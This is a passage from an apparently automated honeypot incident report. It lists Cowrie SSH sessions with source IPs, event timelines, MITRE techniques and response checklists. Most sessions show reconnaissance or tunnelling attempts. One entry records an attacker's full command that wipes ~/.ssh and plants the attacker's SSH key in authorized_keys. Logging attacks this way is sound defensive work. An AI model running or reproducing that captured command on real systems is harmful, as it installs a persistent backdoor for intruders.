| `2026-09-04 11:49:40` | `cowrie.session.connect` |
| `2026-09-04 11:49:40` | `cowrie.client.version` |
| `2026-09-04 11:49:40` | `cowrie.client.kex` |
| `2026-09-04 11:49:41` | `cowrie.login.success` |
| `2026-09-04 11:49:43` | `cowrie.session.params` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.success` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.command.input` |
| `2026-09-04 11:49:43` | `cowrie.log.closed` |
| `2026-09-04 11:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b6bbb5c9919

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:50 |
| **Last Seen** | 2026-09-04 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:50:26` | `cowrie.session.connect` |
| `2026-09-04 11:50:26` | `cowrie.client.version` |
| `2026-09-04 11:50:27` | `cowrie.client.kex` |
| `2026-09-04 11:50:27` | `cowrie.login.success` |
| `2026-09-04 11:50:27` | `cowrie.session.params` |
| `2026-09-04 11:50:27` | `cowrie.command.input` |
| `2026-09-04 11:50:28` | `cowrie.log.closed` |
| `2026-09-04 11:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf14c55fb2c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 11:50 |
| **Last Seen** | 2026-09-04 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:50:54` | `cowrie.session.connect` |
| `2026-09-04 11:50:54` | `cowrie.client.version` |
| `2026-09-04 11:50:54` | `cowrie.client.kex` |
| `2026-09-04 11:50:55` | `cowrie.login.success` |
| `2026-09-04 11:50:55` | `cowrie.direct-tcpip.request` |
| `2026-09-04 11:50:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 11:50:56` | `cowrie.direct-tcpip.data` |
| `2026-09-04 11:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feab780a992a

| Field | Detail |
|---|---|
| **Source IP** | `187.251.123[.]104` |
| **First Seen** | 2026-09-04 11:51 |
| **Last Seen** | 2026-09-04 11:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:51:49` | `cowrie.session.connect` |
| `2026-09-04 11:51:49` | `cowrie.client.version` |
| `2026-09-04 11:51:49` | `cowrie.client.kex` |
| `2026-09-04 11:51:49` | `cowrie.login.success` |
| `2026-09-04 11:51:50` | `cowrie.session.params` |
| `2026-09-04 11:51:50` | `cowrie.command.input` |
| `2026-09-04 11:51:50` | `cowrie.command.failed` |
| `2026-09-04 11:51:50` | `cowrie.log.closed` |
| `2026-09-04 11:51:51` | `cowrie.session.params` |
| `2026-09-04 11:51:51` | `cowrie.command.input` |
| `2026-09-04 11:51:51` | `cowrie.session.file_download` |
| `2026-09-04 11:51:51` | `cowrie.log.closed` |
| `2026-09-04 11:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.251.123[.]104` to AbuseIPDB if not already reported
- [ ] Block `187.251.123[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d32793db0d

| Field | Detail |
|---|---|
| **Source IP** | `187.251.123[.]104` |
| **First Seen** | 2026-09-04 11:51 |
| **Last Seen** | 2026-09-04 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:51:51` | `cowrie.session.connect` |
| `2026-09-04 11:51:51` | `cowrie.client.version` |
| `2026-09-04 11:51:51` | `cowrie.client.kex` |
| `2026-09-04 11:51:51` | `cowrie.login.success` |
| `2026-09-04 11:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.251.123[.]104` to AbuseIPDB if not already reported
- [ ] Block `187.251.123[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea10db9133d3

| Field | Detail |
|---|---|
| **Source IP** | `187.251.123[.]104` |
| **First Seen** | 2026-09-04 11:51 |
| **Last Seen** | 2026-09-04 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:51:51` | `cowrie.session.connect` |
| `2026-09-04 11:51:51` | `cowrie.client.version` |
| `2026-09-04 11:51:51` | `cowrie.client.kex` |
| `2026-09-04 11:51:52` | `cowrie.login.success` |
| `2026-09-04 11:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.251.123[.]104` to AbuseIPDB if not already reported
- [ ] Block `187.251.123[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b1a70b8bd4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:52 |
| **Last Seen** | 2026-09-04 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:52:01` | `cowrie.session.connect` |
| `2026-09-04 11:52:01` | `cowrie.client.version` |
| `2026-09-04 11:52:02` | `cowrie.client.kex` |
| `2026-09-04 11:52:02` | `cowrie.login.success` |
| `2026-09-04 11:52:03` | `cowrie.session.params` |
| `2026-09-04 11:52:03` | `cowrie.command.input` |
| `2026-09-04 11:52:03` | `cowrie.log.closed` |
| `2026-09-04 11:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1ec34bef85

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:53 |
| **Last Seen** | 2026-09-04 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:53:37` | `cowrie.session.connect` |
| `2026-09-04 11:53:37` | `cowrie.client.version` |
| `2026-09-04 11:53:37` | `cowrie.client.kex` |
| `2026-09-04 11:53:37` | `cowrie.login.success` |
| `2026-09-04 11:53:38` | `cowrie.session.params` |
| `2026-09-04 11:53:38` | `cowrie.command.input` |
| `2026-09-04 11:53:38` | `cowrie.log.closed` |
| `2026-09-04 11:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95016b21d641

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:55 |
| **Last Seen** | 2026-09-04 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:55:08` | `cowrie.session.connect` |
| `2026-09-04 11:55:08` | `cowrie.client.version` |
| `2026-09-04 11:55:08` | `cowrie.client.kex` |
| `2026-09-04 11:55:09` | `cowrie.login.success` |
| `2026-09-04 11:55:09` | `cowrie.session.params` |
| `2026-09-04 11:55:09` | `cowrie.command.input` |
| `2026-09-04 11:55:09` | `cowrie.log.closed` |
| `2026-09-04 11:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415520d17c29

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:56 |
| **Last Seen** | 2026-09-04 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:56:39` | `cowrie.session.connect` |
| `2026-09-04 11:56:39` | `cowrie.client.version` |
| `2026-09-04 11:56:39` | `cowrie.client.kex` |
| `2026-09-04 11:56:39` | `cowrie.login.success` |
| `2026-09-04 11:56:40` | `cowrie.session.params` |
| `2026-09-04 11:56:40` | `cowrie.command.input` |
| `2026-09-04 11:56:40` | `cowrie.log.closed` |
| `2026-09-04 11:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de375b231f00

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:58 |
| **Last Seen** | 2026-09-04 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:58:11` | `cowrie.session.connect` |
| `2026-09-04 11:58:11` | `cowrie.client.version` |
| `2026-09-04 11:58:11` | `cowrie.client.kex` |
| `2026-09-04 11:58:12` | `cowrie.login.success` |
| `2026-09-04 11:58:12` | `cowrie.session.params` |
| `2026-09-04 11:58:12` | `cowrie.command.input` |
| `2026-09-04 11:58:13` | `cowrie.log.closed` |
| `2026-09-04 11:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4178e5df2ce1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 11:59 |
| **Last Seen** | 2026-09-04 11:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:59:47` | `cowrie.session.connect` |
| `2026-09-04 11:59:47` | `cowrie.client.version` |
| `2026-09-04 11:59:47` | `cowrie.client.kex` |
| `2026-09-04 11:59:48` | `cowrie.login.success` |
| `2026-09-04 11:59:48` | `cowrie.session.params` |
| `2026-09-04 11:59:48` | `cowrie.command.input` |
| `2026-09-04 11:59:48` | `cowrie.log.closed` |
| `2026-09-04 11:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe5ace6c323

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:01 |
| **Last Seen** | 2026-09-04 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:01:24` | `cowrie.session.connect` |
| `2026-09-04 12:01:24` | `cowrie.client.version` |
| `2026-09-04 12:01:24` | `cowrie.client.kex` |
| `2026-09-04 12:01:24` | `cowrie.login.success` |
| `2026-09-04 12:01:25` | `cowrie.session.params` |
| `2026-09-04 12:01:25` | `cowrie.command.input` |
| `2026-09-04 12:01:25` | `cowrie.log.closed` |
| `2026-09-04 12:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c381c954f22

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 12:02 |
| **Last Seen** | 2026-09-04 12:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:02:07` | `cowrie.session.connect` |
| `2026-09-04 12:02:07` | `cowrie.client.version` |
| `2026-09-04 12:02:07` | `cowrie.client.kex` |
| `2026-09-04 12:02:08` | `cowrie.login.success` |
| `2026-09-04 12:02:08` | `cowrie.direct-tcpip.request` |
| `2026-09-04 12:02:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 12:02:08` | `cowrie.direct-tcpip.data` |
| `2026-09-04 12:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0d8a84139f7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:02 |
| **Last Seen** | 2026-09-04 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:02:59` | `cowrie.session.connect` |
| `2026-09-04 12:02:59` | `cowrie.client.version` |
| `2026-09-04 12:02:59` | `cowrie.client.kex` |
| `2026-09-04 12:02:59` | `cowrie.login.success` |
| `2026-09-04 12:03:00` | `cowrie.session.params` |
| `2026-09-04 12:03:00` | `cowrie.command.input` |
| `2026-09-04 12:03:00` | `cowrie.log.closed` |
| `2026-09-04 12:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ad2cb1fe9a6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-04 12:03 |
| **Last Seen** | 2026-09-04 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:03:12` | `cowrie.session.connect` |
| `2026-09-04 12:03:12` | `cowrie.client.version` |
| `2026-09-04 12:03:12` | `cowrie.client.kex` |
| `2026-09-04 12:03:13` | `cowrie.login.success` |
| `2026-09-04 12:03:13` | `cowrie.direct-tcpip.request` |
| `2026-09-04 12:03:13` | `cowrie.direct-tcpip.data` |
| `2026-09-04 12:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0fdd4e1e0f6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:04 |
| **Last Seen** | 2026-09-04 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:04:38` | `cowrie.session.connect` |
| `2026-09-04 12:04:38` | `cowrie.client.version` |
| `2026-09-04 12:04:38` | `cowrie.client.kex` |
| `2026-09-04 12:04:39` | `cowrie.login.success` |
| `2026-09-04 12:04:39` | `cowrie.session.params` |
| `2026-09-04 12:04:39` | `cowrie.command.input` |
| `2026-09-04 12:04:39` | `cowrie.log.closed` |
| `2026-09-04 12:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b4f71ad935

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:06 |
| **Last Seen** | 2026-09-04 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:06:19` | `cowrie.session.connect` |
| `2026-09-04 12:06:19` | `cowrie.client.version` |
| `2026-09-04 12:06:19` | `cowrie.client.kex` |
| `2026-09-04 12:06:19` | `cowrie.login.success` |
| `2026-09-04 12:06:20` | `cowrie.session.params` |
| `2026-09-04 12:06:20` | `cowrie.command.input` |
| `2026-09-04 12:06:20` | `cowrie.log.closed` |
| `2026-09-04 12:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6630ba7264

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:07 |
| **Last Seen** | 2026-09-04 12:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:07:53` | `cowrie.session.connect` |
| `2026-09-04 12:07:53` | `cowrie.client.version` |
| `2026-09-04 12:07:53` | `cowrie.client.kex` |
| `2026-09-04 12:07:54` | `cowrie.login.success` |
| `2026-09-04 12:07:54` | `cowrie.session.params` |
| `2026-09-04 12:07:55` | `cowrie.command.input` |
| `2026-09-04 12:07:55` | `cowrie.log.closed` |
| `2026-09-04 12:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc31b23f3f77

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:09 |
| **Last Seen** | 2026-09-04 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:09:25` | `cowrie.session.connect` |
| `2026-09-04 12:09:25` | `cowrie.client.version` |
| `2026-09-04 12:09:25` | `cowrie.client.kex` |
| `2026-09-04 12:09:25` | `cowrie.login.success` |
| `2026-09-04 12:09:26` | `cowrie.session.params` |
| `2026-09-04 12:09:26` | `cowrie.command.input` |
| `2026-09-04 12:09:26` | `cowrie.log.closed` |
| `2026-09-04 12:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a7f6ad40514

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:11 |
| **Last Seen** | 2026-09-04 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:11:00` | `cowrie.session.connect` |
| `2026-09-04 12:11:00` | `cowrie.client.version` |
| `2026-09-04 12:11:00` | `cowrie.client.kex` |
| `2026-09-04 12:11:00` | `cowrie.login.success` |
| `2026-09-04 12:11:01` | `cowrie.session.params` |
| `2026-09-04 12:11:01` | `cowrie.command.input` |
| `2026-09-04 12:11:01` | `cowrie.log.closed` |
| `2026-09-04 12:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c51bf7f4820

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:12 |
| **Last Seen** | 2026-09-04 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:12:37` | `cowrie.session.connect` |
| `2026-09-04 12:12:37` | `cowrie.client.version` |
| `2026-09-04 12:12:37` | `cowrie.client.kex` |
| `2026-09-04 12:12:37` | `cowrie.login.success` |
| `2026-09-04 12:12:38` | `cowrie.session.params` |
| `2026-09-04 12:12:38` | `cowrie.command.input` |
| `2026-09-04 12:12:38` | `cowrie.log.closed` |
| `2026-09-04 12:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811ab62466f2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 12:13 |
| **Last Seen** | 2026-09-04 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:13:20` | `cowrie.session.connect` |
| `2026-09-04 12:13:20` | `cowrie.client.version` |
| `2026-09-04 12:13:20` | `cowrie.client.kex` |
| `2026-09-04 12:13:21` | `cowrie.login.success` |
| `2026-09-04 12:13:21` | `cowrie.direct-tcpip.request` |
| `2026-09-04 12:13:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 12:13:22` | `cowrie.direct-tcpip.data` |
| `2026-09-04 12:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d42137b6c59

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:14 |
| **Last Seen** | 2026-09-04 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 12:14:12` | `cowrie.session.connect` |
| `2026-09-04 12:14:12` | `cowrie.client.version` |
| `2026-09-04 12:14:12` | `cowrie.client.kex` |
| `2026-09-04 12:14:12` | `cowrie.login.success` |
| `2026-09-04 12:14:13` | `cowrie.session.params` |
| `2026-09-04 12:14:13` | `cowrie.command.input` |
| `2026-09-04 12:14:13` | `cowrie.log.closed` |
| `2026-09-04 12:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f8618f2624f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-09-04 12:15 |
| **Last Seen** | 2026-09-04 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
